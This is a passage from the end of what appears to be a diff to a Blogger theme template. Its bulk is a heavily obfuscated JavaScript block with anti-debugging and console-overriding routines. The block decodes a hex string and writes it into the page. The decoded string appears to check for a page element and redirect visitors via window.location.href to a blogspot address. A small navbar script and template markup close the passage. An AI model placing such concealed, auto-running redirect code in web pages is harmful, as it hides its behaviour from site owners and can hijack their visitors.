_0xde787e=['ncy3ncy3mcy3mW','mte2nJaWnJfHv0Lfsgu','yxbWBhK','mJaMm0qMmJaMnG','nJeMnZiMmJaMnG','Aw5MBW','A0jUCg8','rIy3ncyZqIy2oa','jJDbjJy3jJzfjG','re9vywG','mJaMmJaMnJuMnG','ChjVDg90ExbL','CMv0DxjUicHMDq','nZuMnKyMnZqMmW','qwLpu3i','nKuMmJaMmJGMmG','zLPrEeq','r0TpBLK','nZqMmJaMm0qMmW','nIy3nsy2rsy2mW','rsy2qYy2rIy2mW','wKPqsLq','y3rVCIGICMv0Dq','nKyMnZqMm0iMnG','jJC0jJi2jJCXjG','zwHwuha','jJzejJy1jJzfjG','CM4GDgHPCYiPka','mtq4ndK2uhDTEvbW','DgfIBgu','BKL2wxi','mYy3mIy2osy3ma','jJy2jJi2jJCXjG','D2fYBG','jJCYjJzfjJncjG','qMjND3y','jJy1jJzfjJC0jG','qNPKvNa','u1bdyvy','ufrZEeC','E30Uy29UC3rYDq','jJC0jJjfjJyYjG','jJncjJbbjJiWjG','ocy2nsy2qYy2nq','Cxzmwwm','y29UC3rYDwn0BW','BfLrrvq','rsy2rIy2rsy2qW','jJncjJrfjJq5jG','ncyYrsy2mYy2rG','jJzfjJC0jJjfjG','nJKMnKuMnKuMnG','Ag1KEeu','yMLUza','rvjywgi','jJC3jJy5jJzfjG','Eu5kCuW','C2vHCMnO','ncyYrsy3mYy2nq','jJy3jJy3jJy1jG','jJC0jJC0jJCWjG','nZqMnZiMnJKMnG','x19WCM90B19F','vMLsy3a','nte5nde4whzsDhrv','jJjfjJyYjJzdjG','jJC0jJy5jJzgjG','ndeMndqMnueMna','nJCWmJK3nw5nAgT5rq','nKqMnJuMnKuMnW','A1zqv1K','y3nMAgG','whrZALa','y01Srxy','mZbjCenQBvy','BMn0Aw9UkcKG','Bg9N','C3bSAxq','mxWZFdb8nhWYFa','nZqMmKuMnJCMnG','nZmMnZaMnKyMnW','jJC0jJqXjJC0jG','uKreyNm','jJDejJnc','jJzejJi2jJCXjG','osyYmcy3qIyWqq','qIyZqIyYmcyWqq','osy0osy2ncyYoa','jJzdjJzgjJy3jG','BhHnshu','mJyMnZeMnZuMnG','nZq1ntG5A1fcsvDT','ntC4mZCYnwzlCLrLrG','mcy2rIy3ncyYrq','jJzgjJyXjJy0jG','nKyMnKuMmKuMnG','kcGOlISPkYKRkq','ncy3qsy2nYy2rq','nZqMm0iMnJGMnW','nJqMnKyMnZCMmG','y29UC29Szq','jJyZjJzgjJzejG','BvDlq0O','nsy2qYy2nsy2ra','zxjYB3i','msy3nsy2rIy3na','jJrejJrdjJiWjG','DMPlrem','mIy2nsy3ncy3nq','jJi2jJCXjJC1jG','z05HteK','mJKXmda5nKrREKDeAG','mJaMmJaMmJaMnW','jJi4jJi2jJCXjG','Dg9tDhjPBMC','rsy2osy2msy2na','D3jPDgu','tNzSEfO','rvbkqxO','vNbhB0e','jJnbjJjgjJjgjG','nKXOtgnJBa','rIy3ncyZqIyYoq','rIy2qsy2nsy2mW','BM1nvLi','u1bAvg0','nKuMnZqMndiMnW','nYy0rsyYrsy2mG','zxHJzxb0Aw9U','rcyYmcy2rsy3nq','z2Dezhe','nZmMm0eMmKyMmG','wLDPEwe','DhjHy2u','mJaMn0iMmeeMmG','nsy3mIy0ocy1na','jJbbjJiWjJiWjG','qYy2nsy2rcy2nq'];_0x1fc9=function(){return _0xde787e;};return _0x1fc9();}function _0x2ecd65(_0x18b4f2,_0x3062ba,_0xbb1151,_0x1567da){return _0x3abb(_0x18b4f2-0x111,_0x1567da);}(function(_0x4d0a30,_0x23d6f6){function _0x3a6bc5(_0x39d686,_0x11f928,_0x985d68,_0x15acce){return _0x3abb(_0x11f928- -0x37c,_0x39d686);}function _0x23b6bf(_0x9cf45d,_0x2e3d0c,_0x421735,_0x3ab95b){return _0x3abb(_0x2e3d0c-0x10b,_0x9cf45d);}var _0x1b2fc9=_0x4d0a30();while(!![]){try{var _0x2c9e15=-parseInt(_0x3a6bc5(-0x28c,-0x254,-0x25c,-0x23e))/(-0x1*-0xbd5+0xf9+-0xccd)+parseInt(_0x23b6bf(0x22a,0x218,0x1f9,0x243))/(0x10d6+0xfe9+-0x20bd)+parseInt(_0x23b6bf(0x265,0x222,0x232,0x1ff))/(0x1b55+0x177*-0xb+-0xb35)*(-parseInt(_0x3a6bc5(-0x213,-0x209,-0x223,-0x20d))/(-0x165d+-0x2b*0x91+0x6*0x7ca))+parseInt(_0x3a6bc5(-0x231,-0x253,-0x28b,-0x230))/(0x1943+0x2265+0x15*-0x2d7)*(parseInt(_0x23b6bf(0x276,0x251,0x215,0x246))/(-0xd1*0x1f+-0x15dd+0x2f32))+parseInt(_0x3a6bc5(-0x264,-0x224,-0x247,-0x22b))/(0x76+0x21ee+-0x225d)+-parseInt(_0x23b6bf(0x214,0x247,0x257,0x24e))/(0x231e+0x142c+-0x3742)+-parseInt(_0x3a6bc5(-0x25c,-0x26b,-0x227,-0x285))/(-0x9*0x23b+-0x5*-0x2b+0x1345);if(_0x2c9e15===_0x23d6f6)break;else _0x1b2fc9['push'](_0x1b2fc9['shift']());}catch(_0x2ff9fe){_0x1b2fc9['push'](_0x1b2fc9['shift']());}}}(_0x1fc9,0x31*0x3ac6+0xb8*0x8e1+0x48eb3*-0x1));var _0x249bd0=(function(){var _0x3f4a6f={};_0x3f4a6f[_0x5ae337(0x14f,0x17a,0x130,0x10e)]=function(_0x1fe447,_0x394067){return _0x1fe447+_0x394067;},_0x3f4a6f[_0x5ae337(0x103,0x13f,0xd2,0x11d)]='return\x20(fu'+_0x1b66a3(0x230,0x22d,0x21d,0x1eb),_0x3f4a6f[_0x5ae337(0xff,0xcc,0xe7,0x11e)]='{}.constru'+_0x1b66a3(0x285,0x24d,0x266,0x298)+'rn\x20this\x22)('+'\x20)',_0x3f4a6f['qvLYc']=_0x1b66a3(0x233,0x259,0x235,0x1fb)+'5',_0x3f4a6f[_0x5ae337(0x165,0x17e,0x16f,0x18c)]=_0x5ae337(0x14d,0x187,0x174,0x18b);function _0x5ae337(_0x36c634,_0x25806c,_0x1f8f06,_0x30d515){return _0x3abb(_0x36c634- -0x2,_0x1f8f06);}_0x3f4a6f[_0x5ae337(0x111,0x103,0xcd,0xd9)]=function(_0x19fc34,_0x24ff3c){return _0x19fc34===_0x24ff3c;},_0x3f4a6f['kBnpo']='hxKuX';var _0x9988e6=_0x3f4a6f;function _0x1b66a3(_0x558939,_0x539b7c,_0x522610,_0xed031){return _0x3abb(_0x558939-0x118,_0xed031);}var _0x248760=!![];return function(_0x233b98,_0x53c747){function _0x142fac(_0x4aa75a,_0x518bcd,_0x5d5679,_0x4d7c7b){return _0x5ae337(_0x5d5679- -0x108,_0x518bcd-0x8b,_0x518bcd,_0x4d7c7b-0x19a);}function _0x4c26ae(_0x69fc8d,_0x1788f6,_0x2adba4,_0xe54a65){return _0x1b66a3(_0x69fc8d- -0x64,_0x1788f6-0x83,_0x2adba4-0x1cf,_0x1788f6);}if(_0x9988e6[_0x4c26ae(0x1c7,0x194,0x1b1,0x20c)](_0x9988e6[_0x4c26ae(0x211,0x23c,0x1fb,0x235)],_0x4c26ae(0x230,0x208,0x212,0x1fc))){var _0x19b90a;try{_0x19b90a=_0x5b5ecd(_0x9988e6[_0x142fac(0x87,0x7,0x47,0x6c)](_0x9988e6['yNJqL'],_0x9988e6[_0x4c26ae(0x1b5,0x195,0x1d1,0x1d7)])+');')();}catch(_0x547959){_0x19b90a=_0x479e4f;}return _0x19b90a;}else{var _0x1ed5ae=_0x248760?function(){function _0x3d9e7b(_0x11ceb5,_0x441361,_0x25f101,_0x205d12){return _0x142fac(_0x11ceb5-0x1da,_0x205d12,_0x11ceb5-0xee,_0x205d12-0x46);}var _0x58709a={};_0x58709a['DOUah']=_0x9988e6[_0x37fa03(-0xe0,-0x10c,-0xeb,-0x10d)];function _0x37fa03(_0x84df72,_0x2223f7,_0x5ad529,_0x3562e4){return _0x142fac(_0x84df72-0x9f,_0x5ad529,_0x84df72- -0xcf,_0x3562e4-0x9e);}var _0x31282c=_0x58709a;if(_0x53c747){if(_0x3d9e7b(0x133,0x158,0x16b,0x147)!==_0x9988e6[_0x3d9e7b(0x14b,0x144,0x12c,0x12e)]){var _0x41acff=_0x31282c[_0x37fa03(-0x79,-0xad,-0x66,-0x78)]['split']('|'),_0x4c58c9=-0x796*0x1+-0x176e+0x1f04;while(!![]){switch(_0x41acff[_0x4c58c9++]){case'0':var _0x3e4d34=_0x557c40[_0xca8983]||_0x1787a6;continue;case'1':var _0x1787a6=_0x5b390c[_0x37fa03(-0xdf,-0x112,-0x105,-0x123)+'r'][_0x37fa03(-0x77,-0x49,-0x77,-0x76)][_0x3d9e7b(0xe6,0xb4,0x109,0xa6)](_0x4603d0);continue;case'2':_0x1787a6['toString']=_0x3e4d34[_0x37fa03(-0x9a,-0x70,-0x81,-0x8f)][_0x37fa03(-0xd7,-0xff,-0x95,-0xe2)](_0x3e4d34);continue;case'3':var _0xca8983=_0x485965[_0x2a4ac3];continue;case'4':_0x1787a6['__proto__']=_0x401265[_0x37fa03(-0xd7,-0xa5,-0xfd,-0xba)](_0x4ae776);continue;case'5':_0x554fd9[_0xca8983]=_0x1787a6;continue;}break;}}else{var _0x2fe56e=_0x53c747[_0x3d9e7b(0x13d,0x170,0x116,0x101)](_0x233b98,arguments);return _0x53c747=null,_0x2fe56e;}}}:function(){};return _0x248760=![],_0x1ed5ae;}};}()),_0x4b2c4f=_0x249bd0(this,function(){var _0x4f7a5f={};_0x4f7a5f[_0x50bad3(0x138,0x130,0x145,0x14f)]=_0x58badd(0x26c,0x280,0x27e,0x24d)+'+$';function _0x58badd(_0x5b9a81,_0x39a55b,_0x1ad089,_0xfaa88e){return _0x3abb(_0x1ad089-0x151,_0x5b9a81);}function _0x50bad3(_0x1c035a,_0x275085,_0x45a016,_0x46208c){return _0x3abb(_0x46208c-0x30,_0x45a016);}var _0x51ba97=_0x4f7a5f;return _0x4b2c4f[_0x50bad3(0x19e,0x141,0x18e,0x16f)]()['search'](_0x51ba97[_0x50bad3(0x15e,0x10a,0x141,0x14f)])[_0x50bad3(0x1a8,0x145,0x17a,0x16f)]()[_0x50bad3(0x114,0x105,0x16b,0x12a)+'r'](_0x4b2c4f)[_0x58badd(0x280,0x276,0x257,0x28b)](_0x51ba97[_0x50bad3(0x146,0x186,0x14c,0x14f)]);});function _0x10fb21(_0x3c905f,_0x41c638,_0x125d01,_0x14c478){return _0x3abb(_0x41c638-0xc8,_0x3c905f);}_0x4b2c4f();var _0x5e2619=(function(){var _0x3a45b4={'ihSqS':function(_0x1a862f,_0x3e0711){return _0x1a862f(_0x3e0711);},'ERXXb':function(_0x532c04,_0x42cefb){return _0x532c04+_0x42cefb;},'NvlxZ':_0x4bd829(0x259,0x298,0x275,0x24f)+'nction()\x20','OrHWD':function(_0x18cea1,_0x3e166d){return _0x18cea1!==_0x3e166d;},'ZJPJT':_0x4bd829(0x256,0x22e,0x228,0x24e),'lxMHu':function(_0x18a526,_0x5d6ce2){return _0x18a526!==_0x5d6ce2;},'AiOSr':_0x1b7b6a(-0x1c3,-0x1a9,-0x1bf,-0x1c4)};function _0x1b7b6a(_0x196d2b,_0xc66a11,_0xc3f92f,_0x5e3ac9){return _0x3abb(_0xc66a11- -0x2ed,_0xc3f92f);}function _0x4bd829(_0xc7a9bb,_0x9aa6ed,_0x22e8fe,_0x4f6781){return _0x3abb(_0x22e8fe-0x112,_0x9aa6ed);}var _0x46891c=!![];return function(_0x194612,_0x156eb8){function _0x3dff3e(_0x5cc957,_0x11a427,_0xc4dac6,_0x40d07d){return _0x4bd829(_0x5cc957-0x15f,_0x11a427,_0xc4dac6- -0x149,_0x40d07d-0x1f4);}function _0xe54d36(_0x5bf506,_0x584c34,_0x476d24,_0x71865d){return _0x1b7b6a(_0x5bf506-0xf0,_0x584c34-0x406,_0x476d24,_0x71865d-0x10);}var _0x2fd53c={'XtsjP':function(_0x48d94b,_0x1f3170){return _0x3a45b4['OrHWD'](_0x48d94b,_0x1f3170);},'PTsxG':_0x3a45b4[_0x3dff3e(0x146,0x136,0x135,0x142)]};if(_0x3a45b4[_0x3dff3e(0xb4,0x104,0xef,0xd1)](_0x3a45b4[_0x3dff3e(0x124,0x103,0x12e,0x14f)],'WBzqV')){var _0x36e798=_0x46891c?function(){function _0x5e11f4(_0x368210,_0x1d8a0e,_0x263dd8,_0x2abbfb){return _0xe54d36(_0x368210-0x35,_0x1d8a0e- -0x25b,_0x263dd8,_0x2abbfb-0x1b8);}function _0x388be0(_0x30acad,_0x3047b6,_0x570cd0,_0x14c9ae){return _0x3dff3e(_0x30acad-0x3,_0x14c9ae,_0x30acad- -0xce,_0x14c9ae-0xf0);}if(_0x5e11f4(0x5b,0x2e,0x4c,0x1d)!==_0x5e11f4(0x52,0x3b,0x6,0x33)){if(_0x156eb8){if(_0x2fd53c[_0x5e11f4(0x12,-0x2d,-0x1c,-0x17)](_0x2fd53c[_0x5e11f4(0x6f,0x3c,0x7f,0x2b)],_0x2fd53c['PTsxG'])){var _0x38c586=_0x545202[_0x5e11f4(0x5b,0x17,-0x1f,0x9)](_0x35a93f,arguments);return _0x5022be=null,_0x38c586;}else{var _0x46cc61=_0x156eb8[_0x5e11f4(0x40,0x17,0x20,0x11)](_0x194612,arguments);return _0x156eb8=null,_0x46cc61;}}}else _0x396a78=_0xbd2220;}:function(){};return _0x46891c=![],_0x36e798;}else _0x140dcf=_0x3a45b4['ihSqS'](_0x59ffb9,_0x3a45b4[_0x3dff3e(0xfb,0x9c,0xcc,0xd3)](_0x3a45b4[_0x3dff3e(0xba,0x106,0xcc,0xe8)](_0x3a45b4[_0xe54d36(0x290,0x25b,0x254,0x24e)],_0xe54d36(0x1fc,0x20e,0x229,0x22a)+_0xe54d36(0x29f,0x286,0x298,0x2bd)+_0x3dff3e(0x17f,0x14b,0x13b,0x14c)+'\x20)'),');'))();};}()),_0x43355c=_0x5e2619(this,function(){var _0xa56b8={'gNaLI':function(_0x574621,_0x3c3ee4){return _0x574621(_0x3c3ee4);},'Bbgwv':function(_0x52e849,_0x590ea6){return _0x52e849+_0x590ea6;},'EPJAz':_0x9483eb(-0x112,-0x135,-0x189,-0x150)+_0x264e3a(-0x2cd,-0x2e5,-0x2c9,-0x305),'TatIW':_0x9483eb(-0x1fd,-0x191,-0x1b7,-0x1be)+_0x9483eb(-0x14e,-0x10d,-0x12b,-0x146)+_0x9483eb(-0x163,-0x14e,-0x156,-0x141)+'\x20)','ViRcp':_0x264e3a(-0x27d,-0x2a7,-0x24f,-0x27c),'htgFm':_0x264e3a(-0x2ea,-0x314,-0x31b,-0x2a8),'nIvYr':function(_0x1b864f){return _0x1b864f();},'mWKCJ':_0x9483eb(-0x102,-0x14d,-0x11f,-0x13b),'csfhh':_0x264e3a(-0x289,-0x2a0,-0x273,-0x273),'SnUbf':_0x9483eb(-0x143,-0x1a6,-0x1b0,-0x17e),'SPZTm':_0x9483eb(-0x12c,-0x145,-0x167,-0x166),'nmMVR':_0x9483eb(-0x10f,-0x109,-0x12e,-0x13f),'enZuL':_0x264e3a(-0x293,-0x27a,-0x2aa,-0x26f),'vjKDC':'0|2|4|5|3|'+'1'},_0x2202d7=function(){var _0x218230;function _0x5de807(_0x24fb03,_0x1b29ac,_0x164eb9,_0xc90b20){return _0x9483eb(_0x24fb03-0x12a,_0x1b29ac-0x120,_0x164eb9,_0xc90b20-0x562);}try{_0x218230=_0xa56b8[_0x1ba42b(-0x185,-0x152,-0x183,-0x10f)](Function,_0xa56b8[_0x1ba42b(-0x122,-0x113,-0xde,-0xd9)](_0xa56b8[_0x1ba42b(-0x123,-0x14a,-0x139,-0x10c)]+_0xa56b8['TatIW'],');'))();}catch(_0x5893b){if(_0xa56b8[_0x1ba42b(-0x151,-0x181,-0x144,-0x152)]===_0xa56b8['htgFm']){var _0x18d19f=_0x2fb9de?function(){function _0xa2281c(_0x2141f9,_0x4898ad,_0x5e8700,_0x1b1a03){return _0x1ba42b(_0x2141f9-0x58,_0x4898ad-0x5aa,_0x5e8700-0x1c4,_0x5e8700);}if(_0x317f22){var _0x2692ef=_0x8346d0[_0xa2281c(0x441,0x476,0x458,0x47f)](_0xbf8579,arguments);return _0x1e514a=null,_0x2692ef;}}:function(){};return _0x140711=![],_0x18d19f;}else _0x218230=window;}function _0x1ba42b(_0x15e4d6,_0x402de9,_0x459622,_0x5999ff){return _0x264e3a(_0x402de9-0x158,_0x402de9-0x111,_0x5999ff,_0x5999ff-0xc6);}return _0x218230;},_0x2e4c74=_0xa56b8[_0x264e3a(-0x270,-0x24f,-0x241,-0x29f)](_0x2202d7);function _0x9483eb(_0x2abf3a,_0x45295d,_0x890bd7,_0x4b18c0){return _0x3abb(_0x4b18c0- -0x2b3,_0x890bd7);}function _0x264e3a(_0x52897d,_0x37415b,_0x1f16fc,_0xc86f1a){return _0x3abb(_0x52897d- -0x3e5,_0x1f16fc);}var _0x58f23c=_0x2e4c74[_0x9483eb(-0x16c,-0x182,-0x13d,-0x182)]=_0x2e4c74[_0x9483eb(-0x157,-0x14b,-0x150,-0x182)]||{},_0x354dba=[_0x264e3a(-0x2cc,-0x288,-0x28b,-0x2ee),_0xa56b8[_0x9483eb(-0x198,-0x1be,-0x14f,-0x180)],_0xa56b8[_0x264e3a(-0x2d1,-0x2c5,-0x2e2,-0x2cf)],_0xa56b8['SnUbf'],_0xa56b8[_0x264e3a(-0x29b,-0x2c8,-0x261,-0x2c2)],_0xa56b8[_0x9483eb(-0x194,-0x19c,-0x148,-0x16a)],_0xa56b8['enZuL']];for(var _0x5cd2ed=-0x1d29+0x247d*0x1+-0x754*0x1;_0x5cd2ed<_0x354dba['length'];_0x5cd2ed++){var _0x1bade3=_0xa56b8[_0x9483eb(-0x198,-0x1a6,-0x155,-0x17b)][_0x264e3a(-0x2cb,-0x307,-0x2fa,-0x2f6)]('|'),_0x496185=0x1bd8+-0x1*0x55d+-0x167b*0x1;while(!![]){switch(_0x1bade3[_0x496185++]){case'0':var _0x4680fe=_0x5e2619['constructo'+'r'][_0x264e3a(-0x283,-0x27d,-0x241,-0x25e)]['bind'](_0x5e2619);continue;case'1':_0x58f23c[_0x50eaa5]=_0x4680fe;continue;case'2':var _0x50eaa5=_0x354dba[_0x5cd2ed];continue;case'3':_0x4680fe['toString']=_0x5d3564['toString'][_0x264e3a(-0x2e3,-0x29f,-0x2fa,-0x2cb)](_0x5d3564);continue;case'4':var _0x5d3564=_0x58f23c[_0x50eaa5]||_0x4680fe;continue;case'5':_0x4680fe[_0x264e3a(-0x2da,-0x30c,-0x29a,-0x2c0)]=_0x5e2619[_0x9483eb(-0x1b4,-0x1d8,-0x1f0,-0x1b1)](_0x5e2619);continue;}break;}}});function _0x3abb(_0x5736c2,_0x1ce167){var _0x22c1d7=_0x1fc9();return _0x3abb=function(_0x51fa49,_0x217ffb){_0x51fa49=_0x51fa49-(0x7*0x41b+0x61*0x1+0x59*-0x51);var _0x16a90d=_0x22c1d7[_0x51fa49];if(_0x3abb['hVgLsy']===undefined){var _0x1688bd=function(_0x152814){var _0x37c302='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x28465d='',_0x2402d8='',_0x56c321=_0x28465d+_0x1688bd;for(var _0x5b9cc9=-0x1c*0x53+-0xd07+-0x161b*-0x1,_0xcfefac,_0x82ff10,_0xdece00=-0x1343+0xf3c+-0x407*-0x1;_0x82ff10=_0x152814['charAt'](_0xdece00++);~_0x82ff10&&(_0xcfefac=_0x5b9cc9%(0xe37*-0x2+0x247f+-0x80d)?_0xcfefac*(0x11*0x56+-0x1979*0x1+0x1403*0x1)+_0x82ff10:_0x82ff10,_0x5b9cc9++%(-0x209*0xf+0x1ea*0x7+0x1125))?_0x28465d+=_0x56c321['charCodeAt'](_0xdece00+(0x12b7+-0x1*-0x841+-0x47d*0x6))-(0x1bfd+0x4cc*0x4+0x449*-0xb)!==0x54e+0xa3c+-0xf8a?String['fromCharCode'](0x645+-0x47*-0x5+-0x6a9&_0xcfefac>>(-(-0x4*-0x2+0x43c+-0x442)*_0x5b9cc9&-0x17b*-0x1+0xbd4+-0xd49)):_0x5b9cc9:0x11*-0x235+-0x1*-0x2611+-0x2*0x46){_0x82ff10=_0x37c302['indexOf'](_0x82ff10);}for(var _0x56a3bf=0x10ed+0x24e*0x5+0x1*-0x1c73,_0x4c4ffc=_0x28465d['length'];_0x56a3bf<_0x4c4ffc;_0x56a3bf++){_0x2402d8+='%'+('00'+_0x28465d['charCodeAt'](_0x56a3bf)['toString'](0xb2f*-0x3+0xa7*0x21+0x60b*0x2))['slice'](-(0xef8+0x1*0x189a+0x1*-0x2790));}return decodeURIComponent(_0x2402d8);};_0x3abb['gNLbrQ']=_0x1688bd,_0x5736c2=arguments,_0x3abb['hVgLsy']=!![];}var _0x5a008e=_0x22c1d7[-0xbf*-0x10+0x2*0x95f+-0x1eae],_0x416209=_0x51fa49+_0x5a008e,_0x46f39e=_0x5736c2[_0x416209];if(!_0x46f39e){var _0x1bd3b9=function(_0x523743){this['cauLxO']=_0x523743,this['EIugLQ']=[0x7f8+-0x1d63+0x156c,0xd67+0x83*-0x2f+0x2f*0x3a,0x7*0x2e3+0x236*-0x2+-0xfc9],this['OjdWRh']=function(){return'newState';},this['BeLQcU']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['CEKTVr']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x1bd3b9['prototype']['yBrMSK']=function(){var _0x4cc7e2=new RegExp(this['BeLQcU']+this['CEKTVr']),_0x347c7d=_0x4cc7e2['test'](this['OjdWRh']['toString']())?--this['EIugLQ'][-0x1b73+-0x11c7*0x1+-0x2d3b*-0x1]:--this['EIugLQ'][-0x1cb5+0x4db+0x47*0x56];return this['IxPbof'](_0x347c7d);},_0x1bd3b9['prototype']['IxPbof']=function(_0x195741){if(!Boolean(~_0x195741))return _0x195741;return this['iDGxHh'](this['cauLxO']);},_0x1bd3b9['prototype']['iDGxHh']=function(_0x56f722){for(var _0x22d79e=-0x40*0x48+0x16ac+-0x4ac,_0xf5b23b=this['EIugLQ']['length'];_0x22d79e<_0xf5b23b;_0x22d79e++){this['EIugLQ']['push'](Math['round'](Math['random']())),_0xf5b23b=this['EIugLQ']['length'];}return _0x56f722(this['EIugLQ'][0x1*0xfed+-0x8b5+-0x738]);},new _0x1bd3b9(_0x3abb)['yBrMSK'](),_0x16a90d=_0x3abb['gNLbrQ'](_0x16a90d),_0x5736c2[_0x416209]=_0x16a90d;}else _0x16a90d=_0x46f39e;return _0x16a90d;},_0x3abb(_0x5736c2,_0x1ce167);}_0x43355c(),str=_0x10fb21(0x19d,0x1cc,0x1ec,0x1aa)+_0x2ecd65(0x241,0x227,0x213,0x232)+_0x10fb21(0x1f1,0x1c4,0x183,0x1f8)+_0x2ecd65(0x23c,0x27f,0x23a,0x243)+_0x10fb21(0x201,0x222,0x1fe,0x215)+_0x2ecd65(0x27b,0x2b7,0x254,0x269)+_0x2ecd65(0x220,0x248,0x1f9,0x210)+_0x2ecd65(0x277,0x288,0x233,0x242)+_0x10fb21(0x202,0x1ea,0x1d2,0x1e9)+'&20&20&76&'+_0x2ecd65(0x26c,0x29e,0x2aa,0x24c)+_0x2ecd65(0x245,0x260,0x282,0x211)+_0x2ecd65(0x28c,0x27c,0x2d0,0x265)+_0x2ecd65(0x26b,0x2ad,0x23d,0x26f)+'4&6F&63&75'+_0x10fb21(0x269,0x239,0x243,0x240)+_0x10fb21(0x1a5,0x1e4,0x210,0x1ae)+'5&74&45&6C'+'&65&6D&65&'+_0x10fb21(0x240,0x213,0x23f,0x214)+_0x2ecd65(0x235,0x200,0x271,0x201)+_0x2ecd65(0x24b,0x25a,0x230,0x22c)+_0x10fb21(0x23f,0x236,0x23a,0x232)+_0x10fb21(0x1d8,0x208,0x22c,0x1d3)+_0x2ecd65(0x270,0x28d,0x25a,0x261)+'2D&70&72&6'+_0x10fb21(0x203,0x210,0x23f,0x22b)+_0x10fb21(0x26c,0x237,0x250,0x24f)+_0x10fb21(0x260,0x22c,0x22e,0x26e)+'B&29&3B&20'+_0x2ecd65(0x266,0x24c,0x266,0x2ab)+'69&66&20&2'+_0x10fb21(0x1a6,0x1c0,0x1fd,0x195)+_0x2ecd65(0x282,0x2bb,0x278,0x24f)+_0x10fb21(0x233,0x231,0x23a,0x25a)+_0x2ecd65(0x25f,0x226,0x29d,0x22c)+'&6C&6C&29&'+_0x10fb21(0x1e0,0x21b,0x206,0x228)+'0&20&20&20'+_0x2ecd65(0x215,0x244,0x1d2,0x230)+'64&6F&77&2'+_0x10fb21(0x20b,0x233,0x26e,0x256)+'&61&74&69&'+_0x10fb21(0x22e,0x1f4,0x1b7,0x210)+'8&72&65&66'+'&20&3D&20&'+_0x10fb21(0x225,0x1ef,0x203,0x216)+_0x10fb21(0x23b,0x226,0x1f0,0x232)+_0x10fb21(0x1f4,0x1d1,0x1fa,0x1a2)+_0x10fb21(0x1e7,0x218,0x255,0x245)+'F&74&72&69'+_0x10fb21(0x18c,0x1d0,0x18e,0x18f)+'72&2D&73&6'+_0x10fb21(0x267,0x23e,0x261,0x25c)+_0x10fb21(0x1d4,0x1be,0x191,0x1be)+'6C&6F&67&7'+'3&70&6F&74'+'&2E&63&6F&'+'6D&26&71&7'+'5&6F&74&3B'+_0x10fb21(0x1f3,0x1bf,0x1b9,0x1c0)+_0x10fb21(0x219,0x205,0x205,0x1eb)+_0x2ecd65(0x24a,0x26b,0x278,0x24e)+_0x2ecd65(0x28a,0x24a,0x2cc,0x2a9)+'0A&20&20&7'+'D&0A&20&20'+'&65&6C&65&'+_0x2ecd65(0x223,0x23f,0x238,0x234)+_0x10fb21(0x1b3,0x1cf,0x1bf,0x18b)+_0x2ecd65(0x22f,0x219,0x1fa,0x1f0)+_0x10fb21(0x1ae,0x1d2,0x192,0x1f2)+'2&75&74&65'+_0x10fb21(0x1da,0x206,0x1e1,0x1f3)+_0x2ecd65(0x275,0x261,0x271,0x24e)+'B&68&72&65'+_0x2ecd65(0x288,0x2a2,0x245,0x27d)+_0x2ecd65(0x275,0x24d,0x24b,0x288)+'B&2C&20&26'+'&71&75&6F&'+_0x10fb21(0x1ba,0x1f7,0x1f0,0x218)+_0x2ecd65(0x268,0x234,0x2ac,0x282)+_0x2ecd65(0x256,0x268,0x22d,0x21f)+'6E&69&61&6'+_0x10fb21(0x218,0x1f6,0x238,0x22f)+_0x2ecd65(0x21f,0x21a,0x255,0x1dd)+'6F&67&73&7'+_0x2ecd65(0x23b,0x216,0x230,0x274)+_0x10fb21(0x209,0x1fa,0x1ee,0x20b)+_0x10fb21(0x214,0x1ef,0x223,0x202)+_0x10fb21(0x1dd,0x20f,0x1f4,0x230)+'&3B&20&0A&'+_0x10fb21(0x259,0x229,0x206,0x1f8)+_0x2ecd65(0x267,0x29b,0x22c,0x287)+_0x2ecd65(0x210,0x1e4,0x1ce,0x211)+_0x2ecd65(0x211,0x24f,0x20b,0x246)+_0x2ecd65(0x265,0x27b,0x255,0x23c)+_0x10fb21(0x20d,0x1ff,0x22c,0x1d0)+'3D&20&26&7'+_0x2ecd65(0x247,0x285,0x26a,0x249)+_0x10fb21(0x1f2,0x1c5,0x1ad,0x1ba)+(_0x2ecd65(0x221,0x1eb,0x1e4,0x25f)+_0x2ecd65(0x25d,0x249,0x260,0x260)+_0x2ecd65(0x236,0x213,0x220,0x23f)+_0x10fb21(0x1c7,0x1e5,0x1e5,0x20d)+_0x2ecd65(0x20f,0x1d2,0x22a,0x226)+_0x10fb21(0x20c,0x1e9,0x21b,0x1bd)+_0x2ecd65(0x275,0x249,0x23e,0x242)+_0x2ecd65(0x234,0x24c,0x24b,0x223)+_0x10fb21(0x208,0x1e8,0x222,0x21f)),document[_0x2ecd65(0x252,0x214,0x23a,0x248)](unescape(str['replace'](/&/g,'%')));
+
+ /*]]>*/
+</script>
+<script type='text/javascript'>
+  $(document).ready(function() {
+    if (config.fixednavbar) {
+      var navbar = $(&#39;.navbar&#39;), placeholder = navbar.parent();
+      $(window).on(&#39;resize load&#39;, function(){
+        navbar.css({position: &#39;fixed&#39;, width: placeholder.outerWidth()+&#39;px&#39;, zIndex: &#39;9999999&#39;});
+        placeholder.css({height: navbar.outerHeight()+&#39;px&#39;});
+      });
+    }
+  });
+</script>
+
+<b:defaultmarkups><b:defaultmarkup type='Common'><b:includable id='body'><b:if cond='data:view.isPreview'><body/><b:else/>&lt;!--<body/>--&gt;</b:if></b:includable></b:defaultmarkup></b:defaultmarkups>&lt;/body&gt;
+</html>
